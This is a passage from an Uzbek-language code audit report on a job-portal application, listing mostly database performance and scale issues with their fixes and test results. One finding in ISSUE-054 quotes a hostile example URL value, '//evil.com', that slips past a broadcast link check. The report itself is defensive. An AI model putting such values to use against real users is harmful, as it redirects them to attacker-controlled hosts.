- **Lead auditor izohi:** Severity P1→P2: foydalanuvchi bo'yicha chegaralangan, lekin katta kompaniyada og'ir.
- **Bajarilgan fix:** Ikki bosqichli indeksli so'rov (`$lookup` yo'q) + 2000 ta chegara va `total`. Server tomonidagi sahifalash va filtrlash qilinmadi (sahifa client'da filtrlaydi). PHASE 6: Vakansiya bo'yicha ariza soni bitta `groupBy` bilan. Sintetik benchmark: 5 000 arizali ish beruvchida p50 3 046 → 3 497 ms, javob 2.6 MB — yaxshilanmadi (ehtimoliy sabab: har ariza bilan to'liq rezyume va holat tarixi; profil qilinmagan).
- **Test/dalil:** e2e ish beruvchi arizalari tekshiruvlari PASS; explain — FINAL_AUDIT.md; PHASE 6: `scale_bench.mjs` oldin/keyin (FINAL_AUDIT.md)
- **Birlashtirilgan manbalar (3):**
  - R034 [db-performance, P1] `apps/api/src/modules/applications/applications.routes.ts:128` — /api/employer/applications — chegarasiz ro'yxat + har ariza uchun TO'LIQ rezyume (experience/education/skills) + statusHistory + vacancy._count
  - R095 [data-scale, P2] `apps/api/src/modules/applications/applications.routes.ts:128` — GET /api/employer/applications: pagination yo'q, relation-filter $lookup, har arizaga to'liq rezyume (experience/education/skills) qo'shiladi
  - R127 [employer-product, P2] `apps/api/src/modules/applications/applications.routes.ts:128` — /api/employer/applications cheklanmagan: barcha arizalar to'liq rezyume bilan bitta javobda, filtr va sahifalash client'da

### ISSUE-046

**Suhbatlar va xabarlar ro'yxati chegarasiz; /api/inbox/summary har 20 soniyada indekssiz count va relation filter; ochilgan suhbatlar client'da cheksiz keshlanadi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** scale/chat
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:168`
- **Root cause:** take/pagination yo'q: /api/conversations (168-191) va unga bog'liq applications findMany (206-232), /api/conversations/:id/messages (321-324), /api/favorites (favorites.routes.ts:20-47), /api/applications (applications.routes.ts:93-119), /api/companies/:slug reviews+vacancies (companies.routes.ts:181-197), getVacancyBySlug company.reviews (vacancies.service.ts:348) faqat o'rtacha reyting uchun barcha sharhlarni yuklaydi. Har detail so'rovida sinxron viewsCount update (359-362) bor, SSR va retry'da ham.
- **Impact:** ~100k xabar va 50k ariza hajmida uzun suhbat yoki katta kompaniya sahifasi MB'lab javob va sekin SSR beradi. Detail sahifaning har ochilishi (botlar ham) yozish amalini kutadi.
- **Evidence:** chat.routes.ts:321-324 message.findMany({ where: { conversationId: id }, orderBy: asc }) — take yo'q; companies.routes.ts:193-197 vacancies where active — take yo'q; vacancies.service.ts:348 reviews: { where: approved, select: { rating } }.
- **Recommended fix:** messages: cursor (before=createdAt) + take 50; conversations: take 50 + cursor. favorites va applications: take 100 (UI filtrlari klientda) yoki cursor. Kompaniya sahifasi: reviews take 20 + aggregate(_avg, _count), vacancies take 50. getVacancyBySlug: reviews o'rniga companyReview.aggregate. viewsCount'ni `void` (fire-and-forget) qilish.
- **Dependencies:** lib/messages/useMessenger, CompanyReviews (limit), detail.ts ratingOf — aggregate natijasini qabul qilishga moslash
- **Risk:** O'rta: frontend ro'yxatlar to'liq ro'yxatga tayanadi (masalan useApplication arizalar ichidan qidiradi).
- **Bajarilgan fix:** Suhbat tarixi oxirgi 1000 xabar; inbox summary ikki bosqichli; suhbatlar ro'yxati va xabarlar uchun cursor sahifalash qilinmadi. PHASE 6: Suhbatlar ro'yxati: oxirgi xabar bitta aggregatsiya, kontekst arizalari vakansiya ID'lari orqali (500 suhbatda p50 1 318 → 523 ms, p95 3 993 → 1 148 ms). Cursor sahifalash qilinmadi.
- **Test/dalil:** e2e chat tekshiruvlari PASS; PHASE 6: `scale_bench.mjs` oldin/keyin; e2e chat tekshiruvlari PASS
- **Birlashtirilgan manbalar (9):**
  - R087 [candidate-public, P2] `apps/api/src/modules/chat/chat.routes.ts:168` — Nomzod oqimidagi cheklanmagan so'rovlar: conversations, messages, favorites, applications, kompaniya sahifasi sharh/vakansiyalari, detail'dagi barcha sharhlar
  - R096 [data-scale, P2] `apps/api/src/modules/chat/chat.routes.ts:479` — /api/inbox/summary har 20 soniyada relation filter bilan application.count bajaradi (har employer tab uchun)
  - R097 [data-scale, P2] `apps/api/src/modules/chat/chat.routes.ts:321` — Suhbat xabarlari va suhbatlar ro'yxati chegarasiz; har ochilishda to'liq tarix va har suhbatga company.description qaytadi
  - R115 [db-performance, P2] `apps/api/src/modules/chat/chat.routes.ts:449` — /api/conversations — barcha suhbatlar chegarasiz, har suhbat uchun nested `messages take:1`, company.description bilan, tartiblash xotirada
  - R116 [db-performance, P2] `apps/api/src/modules/chat/chat.routes.ts:602` — /api/conversations/:id/messages — suhbatning BARCHA xabarlari bir so'rovda
  - R117 [db-performance, P2] `apps/api/src/modules/chat/chat.routes.ts:750` — /api/inbox/summary (header, tez-tez chaqiriladi) — barcha suhbat id'lari + isRead skan + ikki bosqichli relation count
  - R154 [realtime-notifications, P2] `apps/api/src/modules/chat/chat.routes.ts:466` — /api/inbox/summary har 20s har tab'da — isRead indekssiz message count + nested application count
  - R155 [realtime-notifications, P2] `apps/api/src/modules/chat/chat.routes.ts:166` — GET /api/conversations sahifalanmagan, og'ir include va barcha suhbat×kompaniya arizalari bir so'rovda
  - R136 [frontend-state, P2] `apps/web/src/lib/messages/useMessenger.ts:99` — Ochilgan har suhbatning to'liq tarixi cheksiz keshlanadi; xabarlar sahifalanmagan

### ISSUE-047

**GET /api/companies/:slug barcha faol vakansiyalarni (to'liq tavsif bilan) va barcha sharhlarni chegarasiz qaytaradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** scale/api
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:562`
- **Root cause:** include reviews va vacancies'da take yo'q. Vacancies'da region/category bilan to'liq scalar maydonlar keladi. Company'da select yo'q.
- **Impact:** Katta kompaniya (masalan 300 faol vakansiya × 4KB + 1000 sharh) ≈ 1.5MB+ SSR javobi. Frontend baribar PREVIEW_VACANCIES/PREVIEW_REVIEWS bilan kesadi (CompanyDetailView.tsx:94-95). stir/ownerUserId ochiq chiqadi.
- **Evidence:** companies.routes.ts:560-587; apps/web/src/components/companies/detail/CompanyDetailView.tsx:94-95.
- **Recommended fix:** Company uchun select (ichki maydonlarsiz). vacancies: karta select + `take: 50` + `_count` bilan umumiy son. reviews: `take: 20` + `companyReview.aggregate` (_avg, _count). "Barchasi" tabi uchun mavjud /api/vacancies?company=slug pagination'idan foydalaning.
- **Dependencies:** CompanyDetailView tab'lari "hammasini ko'rsatish" uchun alohida fetch'ga o'tishi kerak
- **Risk:** O'rta
- **Bajarilgan fix:** Kompaniya sahifasi: 100 vakansiya / 200 sharh chegarasi, to'liq son va reyting `reviewSummary`/`_count` da; frontend shularni ishlatadi. PHASE 6: Kompaniya sahifasida vakansiyalar soni `_count` dan va sharhlar reytingi to'g'ri hisoblanadi (ISSUE-136, ISSUE-134).
- **Test/dalil:** e2e `[ISSUE-032/033]` (reviewSummary, _count) PASS; web typecheck/build PASS
- **Birlashtirilgan manbalar (3):**
  - R100 [data-scale, P2] `apps/api/src/modules/companies/companies.routes.ts:562` — GET /api/companies/:slug: barcha faol vakansiyalar (description bilan) va barcha approved sharhlar chegarasiz, company scalar'lari (stir, ownerUserId, subscription*) to'liq qaytadi
  - R119 [db-performance, P2] `apps/api/src/modules/companies/companies.routes.ts:562` — /api/companies/:slug — kompaniyaning BARCHA tasdiqlangan sharhlari (user profili bilan) va BARCHA faol vakansiyalari (to'liq description, region, category) bitta javobda
  - R168 [routing-seo, P2] `apps/api/src/modules/companies/companies.routes.ts:175` — Ochiq kompaniya endpoint'i barcha faol vakansiya va barcha tasdiqlangan sharhlarni cheksiz qaytaradi — SSR HTML va JSON-LD shishadi

### ISSUE-048

**Vakansiya ro'yxati: saralash indeksga tushmaydi, har kartaga to'liq kompaniya, count alohida skan; facets 7 ta aggregation va 2000 kompaniya lookup; regex matn qidiruvi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** scale/search
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:129`
- **Root cause:** Yagona mos indeks `@@index([status, publishedAt])` (schema.prisma:436). DATE_ORDER esa isPremium desc bilan boshlanadi, shuning uchun Mongo indeks orqali saralay olmaydi va barcha mos hujjatlarni (description bilan, ~3-5KB) xotirada saralaydi. `popular` (viewsCount) va `salary_*` (isPremium, salaryMin) ham indekssiz. Bundan tashqari buildFilters'dagi relation filtrlari (category.slug, region.slug, company.isVerified/slug) va textFilter'dagi company.name/category.name Prisma Mongo'da $lookup+$match bo'lib bajariladi, bu indeksdan oldingi $match'ni zaiflashtiradi.
- **Impact:** 5k faol × ~4KB ≈ 20MB bitta so'rovda saralanadi, bu /vacancies SSR, home fetchVacancies va har alerts sweep iteratsiyasida takrorlanadi. count() ham shuncha scan qiladi. Chuqur `skip` (page=250) holatini yanada og'irlashtiradi.
- **Evidence:** vacancies.service.ts:129-133 DATE_ORDER; 243-249 findMany orderBy; 170 listBySalary orderBy isPremium+salaryMin; schema.prisma:436-439 indekslar.
- **Recommended fix:** Indekslar qo'shing: `@@index([status, isPremium, publishedAt, id])` (relevance), `@@index([status, publishedAt, id])` (date; mavjud indeksni kengaytirish), `@@index([status, isPremium, salaryMin, id])`, `@@index([status, viewsCount])`. Relation filtrlarini oldindan slug→id resolve qiling (categoryId/regionId/companyId `in`), shunda $lookup kerak bo'lmaydi. `page` uchun yuqori chegara qo'ying (masalan ≤ 100).
- **Dependencies:** prisma db push indekslarni fon rejimida quradi (Mongo 4.2+ optimized build). 20k hujjatda bu soniyalar oladi va xavfsiz, lekin push'ni deploy'dan oldin alohida bajarish tavsiya etiladi
- **Risk:** Past-o'rta: slug→id resolve noma'lum slug'da bo'sh natija berishi kerak (hozirgi xatti-harakat bilan bir xil)
- **Bajarilgan fix:** Indeks `[status,isPremium,publishedAt]`, ro'yxat kartasi select'i (tavsifsiz, kompaniya kartasi). Matn qidiruvi regex va har so'rovdagi `count` qoldi. PHASE 6: Filtrlar va matn qidiruvi relation filter'siz — oldindan aniqlangan ID'lar (matn qidiruvi p50 3 505 → 306 ms, hudud+masofaviy 1 511 → 9 ms); filtrsiz facets 60 s kesh (takroriy p50 480 → 2 ms, cold ~0.6 s). Regex qidiruv va har so'rovdagi `count` qoldi.
- **Test/dalil:** e2e ro'yxat/facets PASS; explain — FINAL_AUDIT.md; PHASE 6: `scale_bench.mjs` oldin/keyin; e2e `[PHASE6-U29]` va filtr/facets tekshiruvlari PASS
- **Birlashtirilgan manbalar (5):**
  - R106 [data-scale, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:129` — Default /vacancies saralashi (isPremium, publishedAt, id) indeksga tushmaydi: har sahifa, har filtrda 5k faol vakansiya blocking sort qilinadi
  - R124 [db-performance, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:232` — Vakansiya ro'yxati: sort indekssiz (xotirada), LIST_INCLUDE `company: true` to'liq kompaniya obyekti, count double-scan, page cap yo'q
  - R125 [db-performance, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:101` — Matn qidiruvi (Meili yo'q rejim): 6 termgacha × (title|description|requirements|company.name|category.name) regex contains — to'liq skan + $lookup, keyin count va 7 facet so'rovi bir xil filtr bilan
  - R126 [db-performance, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:276` — vacancyFacets — 7 ta groupBy/count har so'rovda, companies groupBy 2000 guruh → 2000 id bilan findMany → keyin .slice(0,100)
  - R107 [data-scale, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:35` — LIST_INCLUDE `company: true`: har vakansiya kartasiga to'liq Company hujjati qo'shiladi (description ≤2000, stir, legalName, ownerUserId, subscription*, images)

### ISSUE-049

**Kompaniyalar katalogi har so'rovda barcha mos kompaniyalar uchun 2 ta $lookup'ni saralashdan oldin hisoblaydi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** scale/companies
- **Fayl:** `apps/api/src/modules/companies/companies.list.ts:262`
- **Root cause:** computed $lookup (company_reviews, vacancies) $sort/$limit'dan OLDIN turadi, chunki _sort shu qiymatlardan hisoblanadi. Filtrsiz 2k kompaniya × 2 lookup = 4k indeksli sub-pipeline, har sahifa (cursor) uchun qayta. Home ham fetchCompanies bilan chaqiradi (index/+data.ts:7). vacancyFacets (vacancies.service.ts:276-285) 5 groupBy + 2 count, har biri 5k faol vakansiya ustida va relation filtrli.
- **Impact:** Har /companies va / SSR ≈ 4k lookup + $facet count. Har /vacancies filtr o'zgarishi ≈ 35k hujjat-o'qish (7 × 5k). Kod izohining o'zi (companies.list.ts:20-22) masshtab muammosini tan oladi.
- **Evidence:** companies.list.ts:262-305, 317-344; vacancies.service.ts:269-285.
- **Recommended fix:** Qisqa muddat: filtrsiz birinchi sahifa va facets(query) natijalarini 60s in-memory kesh (query key bo'yicha, LRU ≤500). O'rta muddat: Company'ga denormalizatsiya qilingan activeVacancyCount/ratingAvg/reviewCount/viewsSum maydonlari (vakansiya status o'zgarishi va sharh yozilishida $inc/recompute), ular bo'yicha indeks, $lookup'larni olib tashlash.
- **Dependencies:** Denormalizatsiya vacancies.routes.ts status/delete, admin moderate/block, reviews.routes.ts'ga hook talab qiladi
- **Risk:** Kesh: past. Denormalizatsiya: o'rta (drift xavfi, backfill skripti kerak)
- **Bajarilgan fix:** Kompaniyalar katalogi har so'rovda `$lookup` hisoblaydi — denormalizatsiya kerak (sxema va yozish yo'llari o'zgaradi), cheklangan fix emas. PHASE 6: Kalitli 60 s kesh (vakansiya, kompaniya, logo, sharh va tasdiq yozuvida bekor bo'ladi): takroriy so'rov p50 695 → 1 ms; cold so'rov ~0.75 s qoldi. Denormalizatsiya qilinmadi (D-034).
- **Test/dalil:** PHASE 6: `scale_bench.mjs` oldin/keyin; e2e katalog tekshiruvlari PASS
- **Birlashtirilgan manbalar (2):**
  - R098 [data-scale, P2] `apps/api/src/modules/companies/companies.list.ts:262` — Kompaniyalar katalogi har so'rovda BARCHA mos kompaniyalar uchun 2 ta $lookup'ni saralashdan oldin hisoblaydi; vacancy facets har so'rovda 7 aggregation qiladi
  - R118 [db-performance, P2] `apps/api/src/modules/companies/companies.list.ts:262` — Kompaniyalar katalogi — har so'rovda (va har cursor sahifasida) BARCHA mos kompaniyalar uchun 2 ta $lookup + hisoblangan kalit bo'yicha xotirada sort; text/industry filtri regex

### ISSUE-050

**Kompaniya katalogidagi 'remote/office' filtri faqat employmentType'ga qaraydi, yangi workplaceType maydonini e'tiborsiz qoldiradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** product/workplace
- **Fayl:** `apps/api/src/modules/companies/companies.list.ts:284`
- **Root cause:** $lookup vacancies: `remote: employment_type == "remote"`, `office: employment_type != "remote"`. Yangi e'lonlarda masofaviylik workplace_type'da (vacancies.service.ts:51-56 izohi va employmentWhere). Search index toDoc (search.service.ts:129) va employmentWhere legacy + yangi maydonni to'g'ri birlashtiradi, companies.list esa yo'q.
- **Impact:** workplaceType=remote, employmentType=full_time bo'lgan yangi vakansiyali kompaniya "remote" filtrida chiqmaydi va "office" deb hisoblanadi. Natija noto'g'ri filtr bo'ladi (to'qima emas, lekin noto'g'ri ma'lumot).
- **Evidence:** companies.list.ts:284-285; vacancies.service.ts:54-57; search.service.ts:129.
- **Recommended fix:** `remote: { $max: { $cond: [{ $or: [{ $eq: ["$workplace_type", "remote"] }, { $eq: ["$employment_type", "remote"] }] }, 1, 0] } }`, office esa buning inkori (workplace_type office|hybrid yoki legacy null + employment_type != remote).
- **Dependencies:** Yo'q
- **Risk:** Past
- **Bajarilgan fix:** Katalogdagi masofaviy/ofis filtri `workplace_type` ni, eski yozuvlarda `employment_type` ni ko'radi.
- **Test/dalil:** e2e `[ISSUE-056/050]` PASS

### ISSUE-051

**Maosh statistikasi har so'rovda 20 000 tagacha faol vakansiyani xotiraga o'qiydi, kesh yo'q**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** scale/stats
- **Fayl:** `apps/api/src/modules/stats/salary.stats.ts:190`
- **Root cause:** findMany take 20_000 + category/region relation select'lari (Prisma alohida `in` so'rovlar qiladi), keyin rows.filter + role regex + bir necha sort. salaries/+data.ts:33 har sahifa/filtr o'zgarishida chaqiradi. Sitemap (seo.routes.ts:91-94) har category/region uchun URL beradi, crawler'lar ham shu yo'lni ishlatadi.
- **Impact:** Har hit ≈ 5k hujjat (~0.5-1MB transfer) + Node CPU (~20-50ms). Crawler 50+ filtrli URL'larni ketma-ket ochsa, API event loop band bo'ladi. Ma'lumot kamdan-kam o'zgaradi, hisobni har safar qayta qilish shart emas.
- **Evidence:** salary.stats.ts:104 `MAX_ROWS = 20_000`; 190-204; apps/web/src/pages/salaries/+data.ts:33.
- **Recommended fix:** Proyeksiyani (rows massivi) 5-10 daqiqalik modul-level kesh'da saqlang (bitta promise, stampede'siz), filtrlarni kesh ustida ishlating. Javobga `Cache-Control: public, max-age=300` qo'shing. Ixtiyoriy: query key bo'yicha LRU (≤200).
- **Dependencies:** Yo'q
- **Risk:** Past: raqamlar 5-10 daqiqagacha eskirishi mumkin
- **Bajarilgan fix:** Maosh statistikasi to'plami 5 daqiqa jarayon ichidagi kesh (yozuvda yangilanadi) + `Cache-Control`. PHASE 6: Ariza yozuvi maosh statistikasi keshini endi bekor qilmaydi (ISSUE-125).
- **Test/dalil:** e2e maosh statistikasi PASS
- **Birlashtirilgan manbalar (2):**
  - R103 [data-scale, P2] `apps/api/src/modules/stats/salary.stats.ts:190` — Maosh statistikasi har so'rovda 5k (20k gacha) faol vakansiyani o'qib, xotirada regex/median hisoblaydi; kesh yo'q, /salaries SSR'da ham chaqiriladi
  - R121 [db-performance, P2] `apps/api/src/modules/stats/salary.stats.ts:161` — /api/stats/salary — har so'rovda 20 000 tagacha faol vakansiya (category/region include bilan) xotiraga, kesh yo'q, ochiq endpoint + sitemap havolalari

### ISSUE-052

**Ochiq /api/stats har bosh sahifada indekssiz application.count qiladi, kesh yo'q, 'bugun' UTC bo'yicha; admin overview ham indekssiz**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** scale/stats
- **Fayl:** `apps/api/src/modules/stats/stats.routes.ts:18`
- **Root cause:** Application'da faqat [vacancyId, jobSeekerId] unique, [jobSeekerId] va [resumeId] indekslari bor (schema.prisma:465-467). Kesh yo'q. `setHours(0,0,0,0)` server TZ'da (Railway UTC) hisoblanadi, shuning uchun "bugun" Toshkent vaqti bilan 05:00 da boshlanadi.
- **Impact:** Har home SSR (va har crawler hit) 50k hujjat scan qiladi. company.count() filtrsiz ham to'liq scan (2k, arzon). Trafik oshganda home TTFB sekinlashadi, xato bo'lsa UI'da "0" chiqadi (yuqoridagi P1).
- **Evidence:** stats.routes.ts:11-22; schema.prisma:447-469.
- **Recommended fix:** `@@index([createdAt])` qo'shing (admin overview'dagi 14 kunlik so'rov ham undan foydalanadi). /api/stats javobini 60s in-memory kesh + `Cache-Control: public, max-age=60` bilan bering. startOfToday'ni Asia/Tashkent (UTC+5) bo'yicha hisoblang.
- **Dependencies:** Admin overview fix'i bilan bir xil indeks
- **Risk:** Past
- **Bajarilgan fix:** `/api/stats` 60 s kesh, "bugun" Toshkent bo'yicha, `createdAt` indekslari; admin grafik Toshkent kunlari. PHASE 6: Admin overview "bugun" ham Toshkent kuni bo'yicha (ISSUE-130).
- **Test/dalil:** e2e PASS; explain — FINAL_AUDIT.md
- **Birlashtirilgan manbalar (3):**
  - R104 [data-scale, P2] `apps/api/src/modules/stats/stats.routes.ts:18` — Ochiq /api/stats har bosh sahifa SSR'da application.count(createdAt >= today) bajaradi; createdAt indeksi yo'q, natijada ~50k COLLSCAN
  - R122 [db-performance, P2] `apps/api/src/modules/stats/stats.routes.ts:269` — /api/stats (bosh sahifa) — `application.count({ createdAt >= today })` indekssiz (Application.createdAt), kesh yo'q
  - R214 [data-scale, P3] `apps/api/src/modules/admin/admin.routes.ts:80` — Admin overview va ro'yxatlar: users.createdAt/isBlocked, vacancies.createdAt indekslari yo'q; 14 kunlik ro'yxat xotirada, sana kalitlari TZ bo'yicha nomuvofiq

### ISSUE-053

**Real so'rovlarga mos indekslar yetishmaydi: Application.createdAt, [vacancyId,status]; Vacancy [status,isPremium,publishedAt], [companyId,status]; Notification [userId,createdAt]; Message [conversationId,isRead]; User.createdAt**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** scale/db
- **Fayl:** `apps/api/prisma/schema.prisma:602`
- **Root cause:** Ro'yxat so'rovi `where userId, orderBy createdAt desc, take<=100` — [userId,isRead] indeksi createdAt bo'yicha saralashni bermaydi; eski bildirishnomalar hech qachon o'chirilmaydi (broadcast har safar 10k yozuv qo'shadi).
- **Impact:** Faol foydalanuvchida minglab bildirishnoma → har ochilishda xotirada sort; kolleksiya cheksiz o'sadi (broadcast × userlar).
- **Evidence:** notifications.routes.ts:405-412; schema.prisma:614 `@@index([userId, isRead])`; admin.routes.ts:790-806 broadcast.
- **Recommended fix:** `@@index([userId, createdAt])` (yoki [userId, isRead, createdAt]); 90 kundan eski o'qilgan bildirishnomalarni tozalovchi kunlik job (`deleteMany`) yoki `@@index([createdAt])` + TTL (Prisma TTL indeksni qo'llamaydi — `$runCommandRaw createIndexes expireAfterSeconds` bilan bir marta).
- **Dependencies:** —
- **Risk:** Juda past.
- **Bajarilgan fix:** Application `createdAt`, `[vacancyId,status]`; Vacancy `[status,isPremium,publishedAt]`, `[companyId,status]`; Notification `[userId,createdAt]`; Message `[conversationId,isRead]`; User `createdAt`.
- **Test/dalil:** Dev nusxa bazasida `db push` PASS; explain — FINAL_AUDIT.md
- **Birlashtirilgan manbalar (3):**
  - R109 [db-performance, P2] `apps/api/prisma/schema.prisma:602` — Notification — [userId, isRead] bor, lekin ro'yxat `orderBy createdAt` xotirada; 100k bildirishnoma uchun retention/tozalash yo'q
  - R110 [db-performance, P2] `apps/api/prisma/schema.prisma:436` — Yetishmayotgan indekslar yig'indisi (Application.createdAt, [vacancyId,status], User.createdAt, Vacancy [companyId,status], Company.createdAt, SavedSearch.emailAlertsEnabled, Message [conversationId,isRead])
  - R242 [realtime-notifications, P3] `apps/api/prisma/schema.prisma:614` — Notification: `[userId, createdAt]` indeksi yo'q va retention/TTL yo'q — 100k+ qator cheksiz o'sadi

### ISSUE-054

**Admin broadcast barcha foydalanuvchilarga bitta HTTP so'rov ichida ketma-ket notify() qiladi; url '//host' tekshirilmaydi**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** scale/notifications
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:516`
- **Root cause:** user.findMany chegarasiz (510-513), keyin `for ... await notify()`. Har notify: prefs query + notification insert + (void) telegram user lookup + sendMessage + (void) push subs + (void) email user lookup + sendMail (notifications.service.ts:269-326). void qilingan kanallar parallel to'planadi, rate-limit ham yo'q.
- **Impact:** 10k × ~5 DB so'rov ≈ 50k round-trip, taxminan 2-5 daqiqa. Railway/Vercel proxy timeout'iga uriladi, admin qayta bossa hammasi ikki marta yuboriladi (idempotency yo'q). Telegram 30 msg/s limiti oshib, xabarlar jim yo'qoladi. SMTP'ga bir vaqtda minglab ulanish ochiladi (transport pool yo'q, mailer.ts). Har broadcast 10k Notification hujjati qo'shadi, retention yo'q.
- **Evidence:** admin.routes.ts:500-526; notifications.service.ts:305-325 `void notifyUserViaTelegram`, `void sendUserEmail`; mailer.ts'da `pool: true` yo'q.
- **Recommended fix:** Endpoint 202 qaytarsin, ishni fon job'ida bajarsin (modul darajasida bitta aktiv broadcast lock bilan). In-app qismini `notification.createMany` bilan 500 lik batch'larda yozing, userId'larni cursor bilan o'qing. Telegram/email kanallarini broadcast'da default o'chiring (`channels: ["in_app"]`) yoki concurrency-limitli navbat (masalan 20/s) qiling. nodemailer'da `pool: true, maxConnections: 5` yoqing. Notification uchun retention (masalan 180 kun, createdAt TTL index) ko'rib chiqing.
- **Dependencies:** notifyMany (notifications.service.ts:347) ham xuddi shu ketma-ket naqshda
- **Risk:** O'rta: javob shakli {sent} → {queued} bo'ladi, admin UI'ni moslashtirish kerak
- **Bajarilgan fix:** Ommaviy xabar 202 bilan darhol javob beradi, fonda 500 talik bo'laklarda, bitta vaqtda bitta; `//host` havolasi rad. PHASE 6: Tashqi kanallar kutiladi va tezlik cheklanadi (ISSUE-112); boshqaruv belgili havola rad etiladi (ISSUE-124); keyset sahifalash (ISSUE-126).
- **Test/dalil:** e2e `[ISSUE-054]` PASS; PHASE 6: e2e `[PHASE6-U13]` PASS
- **Birlashtirilgan manbalar (4):**
  - R093 [data-scale, P2] `apps/api/src/modules/admin/admin.routes.ts:516` — Admin broadcast 10k foydalanuvchiga bitta HTTP so'rov ichida ketma-ket notify() qiladi; Telegram/email fire-and-forget oqimi cheksiz
  - R111 [db-performance, P2] `apps/api/src/modules/admin/admin.routes.ts:790` — Admin broadcast — 10k foydalanuvchi uchun ketma-ket notify(): har biri 4–5 DB so'rov + email/push/telegram, bitta HTTP so'rov ichida
  - R150 [realtime-notifications, P2] `apps/api/src/modules/admin/admin.routes.ts:510` — Admin broadcast: barcha userlar bitta HTTP so'rovda ketma-ket notify — minutlab so'rov, timeout'da qayta bosilsa duplicate
  - R262 [security-surface, P3] `apps/api/src/modules/admin/admin.routes.ts:522` — Admin broadcast `url` faqat `startsWith("/")` bilan tekshiriladi — `//evil.com` WS/push payload'iga o'zgarishsiz ketadi

### ISSUE-055

**Alerts sweep chegarasiz, reentrancy guard yo'q (parallel ishga tushsa dublikat bildirishnoma), har obuna uchun keraksiz count**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** scale/alerts
- **Fayl:** `apps/api/src/modules/alerts/alerts.service.ts:355`
- **Root cause:** findMany'da take/cursor yo'q (355-358). Har search uchun listVacancies bajariladi (count + findMany, LIST_INCLUDE bilan to'liq company/category/region, publishedAt filtri SO'ROVDA emas, faqat xotirada 389-390), keyin update. setInterval (454) oldingi tick tugashini kutmaydi. Update notify'dan OLDIN, lekin listVacancies'dan KEYIN bajariladi, shuning uchun overlap bo'lsa ikkala sweep ham eski lastNotifiedAt'ni o'qib, bir xil vakansiyalar uchun ikki marta notify qiladi. /api/admin/alerts/run (admin.routes.ts:497) ham parallel ishga tushishi mumkin.
- **Impact:** 5k × (2-3 query, text filtrda regex+lookup 50-200ms) ≈ 5-15 daqiqa. Bu 15 daqiqalik intervalga yaqin yoki undan uzun, natijada sweep'lar ustma-ust tushib dublikat in-app/Telegram/email yuboriladi va DB doimiy yuk ostida qoladi. 20 dan ortiq yangi vakansiya bo'lsa soni 20 ga kesiladi.
- **Evidence:** alerts.service.ts:355-358, 363-429, 386-387 `pageSize: 20`, 441-455 setInterval.
- **Recommended fix:** (1) Modul darajasida `running` flag qo'shing, tick band bo'lsa skip qilinsin (admin run ham shu flag orqali). (2) Query'ga `publishedAt: { gt: lastNotifiedAt }` qo'shing (VacancyListQuery'ga publishedAfter maydoni), select'ni id/title/slug/publishedAt bilan cheklang. (3) savedSearch'larni cursor bilan 200 tadan o'qing. Where'da daily uchun `lastNotifiedAt < now-20h` sharti bo'lsin, `@@index([emailAlertsEnabled, lastNotifiedAt])` qo'shing. (4) lastNotifiedAt'ni shartli update qiling (`where: { id, lastNotifiedAt: old }`), shunda faqat bitta sweep notify qiladi.
- **Dependencies:** listVacancies'ga publishedAfter qo'shish kerak (vacancies.service.ts buildFilters)
- **Risk:** Past-o'rta: sweep semantikasi o'zgarmaydi
- **Bajarilgan fix:** Obuna sweep: qayta kirish qulfi, 500 talik cursor, yangi e'lon yo'q bo'lsa o'tkazish, optimistik claim, `publishedAfter`. PHASE 6: Sweep oynasi `(since; claimedAt]`, xatoda da'vo qaytariladi, keyset sahifalash (ISSUE-109, ISSUE-110, ISSUE-126).
- **Test/dalil:** API typecheck/build PASS; sweep uchun alohida e2e yo'q
- **Birlashtirilgan manbalar (3):**
  - R094 [data-scale, P2] `apps/api/src/modules/alerts/alerts.service.ts:355` — Alerts sweep: 5k saved search xotiraga yuklanadi, ketma-ket 5k listVacancies ishlaydi, reentrancy guard yo'q, shuning uchun takroriy bildirishnoma ketishi mumkin
  - R112 [db-performance, P2] `apps/api/src/modules/alerts/alerts.service.ts:102` — Alerts sweep — barcha obunalar chegarasiz yuklanadi, har biri uchun to'liq listVacancies (findMany + count, regex matn qidiruvi) ketma-ket, har 15 daqiqada
  - R151 [realtime-notifications, P2] `apps/api/src/modules/alerts/alerts.service.ts:100` — Alert sweep: unbounded savedSearch skan, parallel sweep'da duplicate bildirishnoma, top-20 chegarasi

### ISSUE-056

**Sitemap'lar keshsiz, kompaniyalar filtrsiz (bo'sh profillar ham), orderBy yo'q**

